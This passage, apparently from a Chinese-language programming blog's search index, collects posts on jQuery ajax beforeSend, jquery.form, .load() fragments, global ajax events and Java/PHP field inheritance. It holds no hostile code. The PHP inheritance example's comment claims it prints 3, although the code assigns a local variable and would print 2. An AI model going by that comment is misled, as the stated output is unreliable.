ajax的beforeSend妙用","url":"/blog/2019/03/05/jQuery-ajax%E7%9A%84beforeSend%E5%A6%99%E7%94%A8/","content":"<p>最近看到 jQuery 有<code>beforeSend</code><br>看到這個可以做驗證上面<br>或著動態載入特效<br>先來筆記，感覺很容易忘記</p>\n<a id=\"more\"></a>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;form method=<span class=\"string\">\"post\"</span> action=<span class=\"string\">\"test.php\"</span>&gt;</span><br><span class=\"line\">AA：&lt;input type=<span class=\"string\">\"text\"</span> name=<span class=\"string\">\"aa\"</span> onkeypress=<span class=\"string\">\"if (event.keyCode == 13) &#123;return false;&#125;\"</span>&gt;</span><br><span class=\"line\">&lt;input type=<span class=\"string\">\"radio\"</span> name=<span class=\"string\">\"cc\"</span>&gt;CC</span><br><span class=\"line\">&lt;<span class=\"regexp\">/form&gt;</span></span><br></pre></td></tr></table></figure>\n<p><a href=\"https://xyz.cinc.biz/2016/07/form-input-enter-auto-submit.html\" target=\"_blank\" rel=\"noopener\">XYZ 的筆記本: HTML form 只有一個 text input 時，在 input 上按 enter 會自動送出表單</a><br>之前公司也是用這個解法<br>但是我覺得這個方法寫在 html 真的很長<br>有想到一個方法</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">$(<span class=\"string\">\"input\"</span>).on(<span class=\"string\">\"keypress\"</span>, e =&gt; e.preventDefault());</span><br></pre></td></tr></table></figure>\n<p>ajax 搭配 submit 事件，實做 ajax 後，下面回傳 false，所以表單不會送出去<br><code>beforeSend</code>可以做驗證動作<br>這時候還會有 input 按 Enter 會送出的問題</p>\n<p>EX:</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">$(<span class=\"string\">'form'</span>).on(<span class=\"string\">'submit'</span>,<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  $.ajax(&#123;</span><br><span class=\"line\">    url: <span class=\"string\">'.'</span>,</span><br><span class=\"line\">    data:&#123;</span><br><span class=\"line\">      ...</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    beforeSend: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">      ...</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;)</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<p>由於暫存筆記有記錄 jquery.form.js<br>但是一直沒有記錄，趁著這個時間趕快記錄</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">$(<span class=\"string\">\"#myForm\"</span>).ajaxForm(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  $(<span class=\"string\">\"#output1\"</span>)</span><br><span class=\"line\">    .html(<span class=\"string\">\"提交成功！欢迎下次再来！\"</span>)</span><br><span class=\"line\">    .show();</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">$(<span class=\"string\">\"#myForm2\"</span>).submit(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  $(<span class=\"keyword\">this</span>).ajaxSubmit(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    $(<span class=\"string\">\"#output2\"</span>)</span><br><span class=\"line\">      .html(<span class=\"string\">\"提交成功！欢迎下次再来！\"</span>)</span><br><span class=\"line\">      .show();</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"literal\">false</span>; <span class=\"comment\">//阻止表单默认提交</span></span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://codertw.com/%E5%89%8D%E7%AB%AF%E9%96%8B%E7%99%BC/260779/\" target=\"_blank\" rel=\"noopener\">淺談 jquery.form.js 的 ajaxSubmit 和 ajaxForm 的使用 | 程式前沿</a></p>\n<p>簡單來說<code>ajaxForm</code>和<code>ajaxSubmit</code>看起來很像<br>但簡單來說<code>ajaxForm</code>是拿當下 form 做 submit 時候，不會送出去，會做 ajax<br>這就是跟一般 ajax 差別</p>\n<p><code>ajaxSubmit</code>是當下呼叫拿當下 form 做 ajax 動作<br>所以上面範例是寫在<code>.submit()</code>裡面</p>\n<p>ajax 拿來放在 submit 可以簡單做到表單綁定效果</p>\n<p>以下是筆記暫存就放在下面<br>怕沒有甚麼機會寫到</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># JQuery Form Validate</span><br><span class=\"line\">[使用jQuery.form庫中ajaxSubmit提交表單時遇到的一些問題 - 掃文資訊](https://hk.saowen.com/a/e36ca7b7b772fcc2699400c165fb9129964364e45217a35412ca0cdb21b37b63)</span><br><span class=\"line\">https://jqueryvalidation.org/documentation/</span><br><span class=\"line\">http://formvalidation.io/examples/</span><br><span class=\"line\"></span><br><span class=\"line\">[Bootstrap 表單驗證formValidation 之表單動態驗證 - CSDN博客](https://blog.csdn.net/u012123026/article/details/53288641)</span><br><span class=\"line\">[Bootstrap 表单验证formValidation 之表单动态添加元素之后再次验证 - CSDN博客](https://blog.csdn.net/weixin_40475396/article/details/79879094)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">jQuery Form</span><br><span class=\"line\">[jQuery Form Plugin中AjaxForm与AjaxSubmit的区别-飘一代-51CTO博客](http://blog.51cto.com/fluagen/393134)</span><br><span class=\"line\">把傳統表單迅速套成ajaxForm，submit可以做成ajax動作</span><br><span class=\"line\"></span><br><span class=\"line\"># waitme</span><br><span class=\"line\"></span><br><span class=\"line\"># ajaxsuccess</span><br><span class=\"line\">[Ajax-Global Ajax Event Handlers .ajaxComplete()、.ajaxError()、.ajaxSend()、.ajaxStart()、.ajaxStop()、.ajaxSuccess() | 阿沙布魯 - 點部落](https://dotblogs.com.tw/brooke/2016/07/10/142933)</span><br><span class=\"line\"></span><br><span class=\"line\">可搭配waitme實做</span><br></pre></td></tr></table></figure>\n<p>參考來源:</p>\n<ul>\n<li><a href=\"https://expect7.pixnet.net/blog/post/39829979-%5B%E7%A8%8B%E5%BC%8F%5D%5Bjquery%5D-%E8%AE%93ajax%E9%81%8B%E4%BD%9C%E7%9A%84%E6%99%82%E5%80%99%EF%BC%8C%E8%B7%B3%E5%87%BAloding%E7%9A%84%E8%A8%8A\" target=\"_blank\" rel=\"noopener\">[程式][JQuery] 讓 AJAX 運作的時候，跳出 loding 的訊息。－Part 1 @ 四處流浪的阿基。I am Vagrant Walker :: 痞客邦 ::</a></li>\n<li><a href=\"https://github.com/jquery-form/form\" target=\"_blank\" rel=\"noopener\">jquery-form/form: jQuery Form Plugin</a></li>\n<li><a href=\"https://blog.51cto.com/fluagen/393134\" target=\"_blank\" rel=\"noopener\">jQuery Form Plugin 中 AjaxForm 与 AjaxSubmit 的区别-飘一代-51CTO 博客</a></li>\n<li><a href=\"https://www.cnblogs.com/liuhongfeng/p/5150389.html\" target=\"_blank\" rel=\"noopener\">jQuery form 插件的使用–ajaxForm()和 ajaxSubmit()的可选参数项对象 - souvc - 博客园</a></li>\n<li><a href=\"http://www.blueshop.com.tw/board/FUM20041006152641OLG/BRD20060619104902G2O.html\" target=\"_blank\" rel=\"noopener\">防止 ENTER 鍵直接 SUBMIT- 藍色小舖 BlueShop</a></li>\n<li><a href=\"https://blog.csdn.net/ligang2585116/article/details/44699567\" target=\"_blank\" rel=\"noopener\">HTML 防止 input 回车提交表单 - 李刚的学习专栏 - CSDN 博客</a></li>\n<li><a href=\"https://xyz.cinc.biz/2016/07/form-input-enter-auto-submit.html\" target=\"_blank\" rel=\"noopener\">XYZ 的筆記本: HTML form 只有一個 text input 時，在 input 上按 enter 會自動送出表單</a></li>\n<li><a href=\"http://david-chen-blog.logdown.com/posts/177766-how-forms-submit-when-pressing-enter\" target=\"_blank\" rel=\"noopener\">Press Enter to Submit 背后的那些事 « David Chen’s Blog</a></li>\n<li><a href=\"https://jsbin.com/namefaqija/edit?html,css,js,output\" target=\"_blank\" rel=\"noopener\">JS Bin - JS Bin</a></li>\n</ul>\n","categories":["JavaScript"],"tags":["ajax","javascript","jquery"]},{"title":"jQuery快速方便載入(load)方法","url":"/blog/2019/03/06/jQuery%E5%BF%AB%E9%80%9F%E6%96%B9%E4%BE%BF%E8%BC%89%E5%85%A5-load-%E6%96%B9%E6%B3%95/","content":"<p>之前<a href=\"https://malagege.github.io/blog/2019/02/19/Bootstrap-%E4%B8%8D%E7%9F%A5%E9%81%93Modal%E4%B8%80%E4%BA%9B%E4%BA%8B%E7%AD%86%E8%A8%98/\">Bootstrap 不知道 Modal 一些事筆記 | 程式狂想筆記</a>有紀錄 jquery load 事情<br>但是今天看到還有更神奇的<code>load</code><br>以前沒甚麼用到這個函式<br>不過覺得在單一網頁不要讓頁面複雜的時候<br>可以使用這個方法切出 component</p>\n<a id=\"more\"></a>\n<p>不過剛開始看 load，想說是單純<code>.html( data )</code>載入<br>看是看了一下文件，功能比我想像的還多<br>超乎我的想像<br>所以就心虛寫這篇，虧我寫 jQuery 那麼久都不知道有那麼強大的功能 orz</p>\n<h2 id=\"一般使用-load\"><a href=\"#一般使用-load\" class=\"headerlink\" title=\"一般使用 load\"></a>一般使用 load</h2><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">$(<span class=\"string\">\"#result\"</span>).load(<span class=\"string\">\"ajax/test.html\"</span>);</span><br></pre></td></tr></table></figure>\n<p>內容會載入到 選擇器上面。</p>\n<p>後面可以放 callback，完成的時候會執行<br><strong>備註:此方法會載入 css,js 網頁所有內容</strong></p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">$(<span class=\"string\">\"#result\"</span>).load(<span class=\"string\">\"ajax/test.html\"</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  alert(<span class=\"string\">\"Load was performed.\"</span>);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<h2 id=\"load-可以指定網頁內容-div-Loading-Page-Fragments\"><a href=\"#load-可以指定網頁內容-div-Loading-Page-Fragments\" class=\"headerlink\" title=\"load 可以指定網頁內容 #div(Loading Page Fragments)\"></a>load 可以指定網頁內容 #div(Loading Page Fragments)</h2><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">$(<span class=\"string\">\"#result\"</span>).load(<span class=\"string\">\"ajax/test.html #container\"</span>);</span><br></pre></td></tr></table></figure>\n<p>這算是我讓我驚訝的功能，而且不會載入 ajax 裡面頁面<code>html</code>,<code>body</code>,<code>script</code>裡面內容<br><strong>備註:此方法會<code>不會</code>載入 css,js 網頁所有內容</strong><br>這是出乎意料的事情</p>\n<p>可以在 jQuery 官網<a href=\"http://api.jquery.com/\" target=\"_blank\" rel=\"noopener\">jQuery API Documentation</a><br>開起開發者工具來看，<br>這段 js,css 都會重新載入</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">$(<span class=\"string\">\"body\"</span>).load(<span class=\"string\">\"/\"</span>);</span><br></pre></td></tr></table></figure>\n<p>下面這段 js,css 都不會重新載入</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">$(<span class=\"string\">\"body\"</span>).load(<span class=\"string\">\"/ #global-nav\"</span>);</span><br></pre></td></tr></table></figure>\n<p>不管寫在 body 後面，或者<code>#global-nav</code>都不會執行<br>但對於後面綁定可能真的要寫在 callback 那邊了</p>\n<h2 id=\"load-可帶參數-post-內容\"><a href=\"#load-可帶參數-post-內容\" class=\"headerlink\" title=\"load 可帶參數 post 內容\"></a>load 可帶參數 post 內容</h2><p>這個就太簡單了，直接複製官網文件內容</p>\n<p>Example: 發送數組形式的 data 參數到服務器。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">$(<span class=\"string\">\"#objectID\"</span>).load(<span class=\"string\">\"test.php\"</span>, &#123; <span class=\"string\">\"choices[]\"</span>: [<span class=\"string\">\"Jon\"</span>, <span class=\"string\">\"Susan\"</span>] &#125;);</span><br></pre></td></tr></table></figure>\n<p>Example: Same as above, but will POST the additional parameters to the server and a callback that is executed when the server is finished responding.</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">$(<span class=\"string\">\"#feeds\"</span>).load(<span class=\"string\">\"feeds.php\"</span>, &#123; <span class=\"attr\">limit</span>: <span class=\"number\">25</span> &#125;, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  alert(<span class=\"string\">\"The last 25 entries in the feed have been loaded\"</span>);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://www.jquery123.com/load/\" target=\"_blank\" rel=\"noopener\">.load() : 从服务器载入数据并且将返回的 HTML 代码并插入至 匹配的元素 中。 - jQuery API 中文文档 | jQuery 中文网</a></p>\n","categories":["JavaScript"],"tags":["jquery","load"]},{"title":"jQuery自訂的ajax Event","url":"/blog/2018/04/24/jquery%E8%87%AA%E8%A8%82%E7%9A%84ajax%20Event/","content":"<p>今天看到<a href=\"https://dotblogs.com.tw/brooke/2016/07/10/142933\" target=\"_blank\" rel=\"noopener\">Ajax-Global Ajax Event Handlers .ajaxComplete()、.ajaxError()、.ajaxSend()、.ajaxStart()、.ajaxStop()、.ajaxSuccess() | 阿沙布魯 - 點部落</a><br>平常都不會這樣寫，發現這樣寫可以模組化<br>今天用少部份時間，來研究出來ajax event來實做出動畫特效<br><strong>備註：ajax event都是jQuery自訂的，原JavaScript沒有這個東西</strong></p>\n<a id=\"more\"></a>\n<p>拿線上別人寫好的AJAX DEMO小改<br><a href=\"http://jsfiddle.net/WQXXT/12468/\" target=\"_blank\" rel=\"noopener\">jQuery AJAX request demo - JSFiddle</a></p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">$(<span class=\"built_in\">document</span>).on(<span class=\"string\">'ajaxSend'</span>,<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    $(<span class=\"string\">'#overlay'</span>).show();</span><br><span class=\"line\">    $(<span class=\"string\">'#overlay'</span>).width(<span class=\"string\">'100%'</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\">    $(<span class=\"built_in\">window</span>).on(<span class=\"string\">'beforeunload'</span>,<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">  \t    <span class=\"keyword\">if</span>( confirm(<span class=\"string\">'查詢未完成，是否要離開?'</span>))&#123;</span><br><span class=\"line\">    \t    <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">&#125;).on(<span class=\"string\">'ajaxComplete'</span>,<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    $(<span class=\"string\">'#overlay'</span>).width(<span class=\"string\">'0px'</span>);</span><br><span class=\"line\">    $(<span class=\"built_in\">window</span>).off(<span class=\"string\">'beforeunload'</span>);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<p>注意：jQuery onload 3.0就不能用了，要使用beforeunload才對<br><a href=\"https://sinaad.github.io/xfe/2016/06/29/beforeunlod-vs-unload/\" target=\"_blank\" rel=\"noopener\">各个浏览器中对于beforeunload事件和unload事件的对比 | {XFE}</a><br>其實這個東西還可以寫一篇才對…..</p>\n<p>原本想說CSS不會花太多時間<br>結果還是花了一點點….</p>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-id\">#overlay</span>&#123;</span><br><span class=\"line\">  <span class=\"attribute\">width</span>: <span class=\"number\">0%</span>;</span><br><span class=\"line\">  <span class=\"attribute\">height</span>: <span class=\"number\">100%</span>;</span><br><span class=\"line\">  <span class=\"attribute\">display</span>: none;</span><br><span class=\"line\">  <span class=\"attribute\">position</span>: fixed;</span><br><span class=\"line\">  <span class=\"attribute\">top</span>:<span class=\"number\">0px</span>;</span><br><span class=\"line\">  <span class=\"attribute\">left</span>:<span class=\"number\">0px</span>;</span><br><span class=\"line\">  <span class=\"attribute\">transition</span>: all .<span class=\"number\">3s</span>;</span><br><span class=\"line\">    <span class=\"attribute\">overflow</span>: hidden;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-id\">#overlay_mask</span>&#123;</span><br><span class=\"line\">  <span class=\"attribute\">width</span>: <span class=\"number\">100vw</span>;</span><br><span class=\"line\">  <span class=\"attribute\">height</span>: <span class=\"number\">100%</span>;</span><br><span class=\"line\">  <span class=\"attribute\">font-size</span>: <span class=\"number\">6em</span>;</span><br><span class=\"line\">  <span class=\"attribute\">background</span>: <span class=\"built_in\">rgba</span>(0,0,0,0.6);</span><br><span class=\"line\">    <span class=\"attribute\">display</span>:flex;</span><br><span class=\"line\">    <span class=\"attribute\">align-items</span>:center;</span><br><span class=\"line\">    <span class=\"attribute\">justify-content</span>:center;</span><br><span class=\"line\">  <span class=\"comment\">/* display:none; */</span></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><code>#overlay_mask</code>那邊花了不少時間解決<br>原本是用1000px，但覺得應該有更好的<br>使用<code>vh</code>沒有占全版<br><code>vw</code>就解決了</p>\n<blockquote>\n<p>vw——代表视窗(Viewport)的宽度为1%，在我们的例子里50vw = 500px。<br>vh——窗口高度的百分比 50vh = 400px。<br>vmin——vmin的值是当前vw和vh中较小的值。在我们的例子里因为是横向模式，所以50vim = 400px。<br>vmax——大尺寸的百分比。50vmax = 500px。<br>著作权归作者所有。<br>商业转载请联系作者获得授权,非商业转载请注明出处。<br>原文: <a href=\"https://www.w3cplus.com/css/simplify-your-stylesheets-with-the-magical-css-viewport-units.html\" target=\"_blank\" rel=\"noopener\">https://www.w3cplus.com/css/simplify-your-stylesheets-with-the-magical-css-viewport-units.html</a> © w3cplus.com<br><a href=\"https://hk.saowen.com/a/0d16a289be70d5fa8cb0b56df1c3ee78825f3f607e6870e30f769861f566a33b\" target=\"_blank\" rel=\"noopener\">視區相關單位vw, vh..簡介以及可實際應用場景 - 掃文資訊</a></p>\n</blockquote>\n<p>花了不少時間，但相信這個對未來實做<a href=\"http://expect7.pixnet.net/blog/post/39829979-%5B%E7%A8%8B%E5%BC%8F%5D%5Bjquery%5D-%E8%AE%93ajax%E9%81%8B%E4%BD%9C%E7%9A%84%E6%99%82%E5%80%99%EF%BC%8C%E8%B7%B3%E5%87%BAloding%E7%9A%84%E8%A8%8A\" target=\"_blank\" rel=\"noopener\">[程式][JQuery] 讓AJAX運作的時候，跳出loding的訊息。－Part 1 @ 四處流浪的阿基。I am Vagrant Walker :: 痞客邦 ::</a></p>\n<blockquote>\n<p>   .ajaxComplete() - runs for every request that completes, use this when you want to do something with each request/result. Note that this doesn’t replace the success handler, since the parsed data is not one of the arguments (and it runs even when there’s an error) - you may want .ajaxSuccess() in some per-request situations instead.<br>    .ajaxStop() - runs when every batch of requests completes, usually you’d use this in combination with .ajaxStart() for things like showing/hiding a “Loading…” indicator of some sort - or to do something else once a batch of AJAX requests finishes, like a master last step.<br><a href=\"https://stackoverflow.com/questions/4419241/jqueryajaxstop-versus-jqueryajaxcomplete\" target=\"_blank\" rel=\"noopener\">ajax - jquery::ajaxStop() versus jquery::ajaxComplete() - Stack Overflow</a></p>\n</blockquote>\n<p>恩…英文弱弱的…有找一下中文版說明XD</p>\n<blockquote>\n<p>   .ajaxComplete() ——運行每個請求完成,用這個當你想做一些與每個請求/結果。 注意這並不替換 success 處理程序，因為解析的數據不是一個參數( 即使有錯誤，它也運行) - 你可能需要 .ajaxSuccess() 在某些per-request情況下。<br>    .ajaxStop() ——運行當完成每批請求,通常你有使用這種結合 .ajaxStart() 例如顯示/隱藏某種”正在載入。”指示器,或者做一些其他一批ajax請求完成後,就像一個主人的最後一步。<br><a href=\"http://hant.ask.helplib.com/ajax/post_779385\" target=\"_blank\" rel=\"noopener\">jquery::ajaxStop() 与 jquery::ajaxComplete( )<em>ajax</em>帮酷编程问答</a></p>\n</blockquote>\n<p>相信這個能跟下面UI整合，有空再實做<br><a href=\"http://vadimsva.github.io/waitMe/\" target=\"_blank\" rel=\"noopener\">waitMe</a><br><a href=\"https://piccard21.github.io/busy-load/\" target=\"_blank\" rel=\"noopener\">busy-load</a><br><a href=\"http://malsup.com/jquery/block/#page\" target=\"_blank\" rel=\"noopener\">jQuery BlockUI Plugin</a></p>\n<p>因為BlockUI看到是用<code>$(document).ajaxStop($.unblockUI);</code>，有去找兩著比較ajaxComplete、ajaxStop<br>我看到範例是用ajaxComplete，不過照文件說用ajaxStop做顯示/隱藏是最好的樣子</p>\n<p>這篇其實有很多雜七雜八的東西，其實要分開寫會比較好…<br>不過哪天再踩到雷再補好了</p>\n","categories":["jQuery"],"tags":["ajax","jQuery","event"]},{"title":"java method 類別成員(class member) 繼承踩雷","url":"/blog/2018/08/14/java-method-%E9%A1%9E%E5%88%A5%E6%88%90%E5%93%A1-class-member-%E7%B9%BC%E6%89%BF%E8%B8%A9%E9%9B%B7/","content":"<p>這篇先記錄最近改報表所踩到雷<br>一直以為我覺得 class member 也可以做 java Overwrite<br>但 overwrite 好像是指 method<br>在做繼承方發一想不到事情</p>\n<a id=\"more\"></a>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">A</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> usertype = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">ok</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        System.out.println(usertype);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String args[])</span> </span>&#123;</span><br><span class=\"line\">        C c = <span class=\"keyword\">new</span> C();</span><br><span class=\"line\">        c.ok();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">B</span> <span class=\"keyword\">extends</span> <span class=\"title\">A</span></span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// int usertype = 2;</span></span><br><span class=\"line\">    B()&#123;</span><br><span class=\"line\">        usertype = <span class=\"number\">2</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">C</span> <span class=\"keyword\">extends</span> <span class=\"title\">B</span></span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// int usertype = 3;</span></span><br><span class=\"line\">    C()&#123;</span><br><span class=\"line\">        usertype = <span class=\"number\">3</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>結果印出應該是 3</p>\n<p>但是把 usertype=2 跟 usertype=3 前面注解拿掉<br>印出來的東西會是<code>0</code><br>這個雷…</p>\n<p>做後原本想做 js 做做看</p>\n<p>JS class 不能用 class member…<br>發現 typescript 也不行<br>可能真的在 class member 轉 function 行不通</p>\n<p>又好奇試試 PHP<br>結果發現跟 JAVA 完全不一樣的結果</p>\n<p>PHP</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">A</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $a = <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">ok</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"keyword\">$this</span>-&gt;a;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">B</span> <span class=\"keyword\">extends</span> <span class=\"title\">A</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $a =<span class=\"number\">2</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">C</span> <span class=\"keyword\">extends</span> <span class=\"title\">B</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        $a =<span class=\"number\">3</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">$o = <span class=\"keyword\">new</span> C();</span><br><span class=\"line\">$o-&gt;ok();</span><br><span class=\"line\"><span class=\"comment\">//print 3</span></span><br></pre></td></tr></table></figure>\n<p>PHP class 比較像 JAVA，但結果不一樣…，我感到意外<br>不過…抽象類別 裡面方法不能用抽象 function<br>詳細<a href=\"https://kejyuntw.gitbooks.io/php-learning-notes/class/abstract-class.html\" target=\"_blank\" rel=\"noopener\">抽象類別（Abstract Class） · PHP 學習筆記</a></p>\n<p>python,golang 我就不試了 orz</p>\n<p><a href=\"https://ithelp.ithome.com.tw/articles/10184771\" target=\"_blank\" rel=\"noopener\">D2:［Java］類別的繼承（基本範例解說） - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天</a></p>\n<h3 id=\"2019-02-21\"><a href=\"#2019-02-21\" class=\"headerlink\" title=\"2019-02-21\"></a>2019-02-21</h3><p>今天剛好做 PHP 有關 class，突然想到 Java 之前遇到的問題還沒有理解為什麼</p>\n<p>感覺<code>this</code>是參照原本 method 那一層的(這一點跟 PHP self 很像，\\$this 是實例物件)<br>所以一直抓到<code>父層 A</code>，沒有解決抓到在<code>C</code><br>這解決方法除了寫在建構式，寫在子層<code>static</code>也能解決</p>\n<blockquote>\n<p>我原先的錯誤想法<br>在想是因為 extends，所以父層 function 複製到子層那邊去<br>其實用參照(reference)的方法想就很好懂了</p>\n</blockquote>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Son</span> <span class=\"keyword\">extends</span> <span class=\"title\">Dad</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">static</span> &#123;</span><br><span class=\"line\">       me = <span class=\"string\">'son'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://stackoverflow.com/questions/685300/is-there-a-way-to-override-class-variables-in-java\" target=\"_blank\" rel=\"noopener\">inheritance - Is there a way to override class variables in Java? - Stack Overflow</a></p>\n<p>難怪最近看到有一個程式<br>宣告 class 裡面的變數<br>都不會直接給值，都寫在 <code>constructor</code></p>\n<p>也許子層不需要再重新宣告父層有的變數<br>複寫都在<code>constructor</code>可能會比較好<br>這可能是最好的良好習慣</p>\n<p>參考來源:</p>\n<ul>\n<li><a href=\"https://openhome.cc/Gossip/JavaGossip-V1/AboutThis.htm\" target=\"_blank\" rel=\"noopener\">關於 this</a></li>\n<li><a href=\"https://openhome.cc/Gossip/Java/Lambda-this-final.html\" target=\"_blank\" rel=\"noopener\">this 與 final</a></li>\n<li><a href=\"http://www.pilishen.com/posts/php-late-static-bindings-in-laravel\" target=\"_blank\" rel=\"noopener\">通过 static 关键词来实现 late static binding（静态调用绑定）-pilishen.com,做全球最好的实战教程</a></li>\n<li><a href=\"https://programming.im.ncnu.edu.tw/J_Chapter6.htm\" target=\"_blank\" rel=\"noopener\">繼承</a></li>\n<li><a href=\"http://whitecat2.pixnet.net/blog/post/56375979-%5Bjava%E7%A8%8B%E5%BC%8F%E7%AD%86%E8%A8%98%5D%E5%BB%BA%E6%A7%8B%E5%AD%90constructor---%E8%A7%80%E5%BF%B5%E8%88%87%E4%BE%8B%E9%A1%8C%E7%A0%94\" target=\"_blank\" rel=\"noopener\">[java 程式筆記]建構子 Constructor - 觀念與例題研究 @ 貓羽的文字日誌 :: 痞客邦 ::</a></li>\n<li><a href=\"https://stackoverflow.com/questions/8763271/accessing-inherited-class-variables-in-java\" target=\"_blank\" rel=\"noopener\">inheritance - Accessing inherited class variables in java - Stack Overflow</a></li>\n<li><a href=\"https://www.javaworld.com.tw/jute/post/view?bid=29&amp;id=181644\" target=\"_blank\" rel=\"noopener\">JWorld@TW Java 論壇 - 建構子??</a></li>\n<li><a href=\"https://stackoverflow.com/questions/685300/is-there-a-way-to-override-class-variables-in-java\" target=\"_blank\" rel=\"noopener\">inheritance - Is there a way to override class variables in Java? - Stack Overflow</a></li>\n<li><a 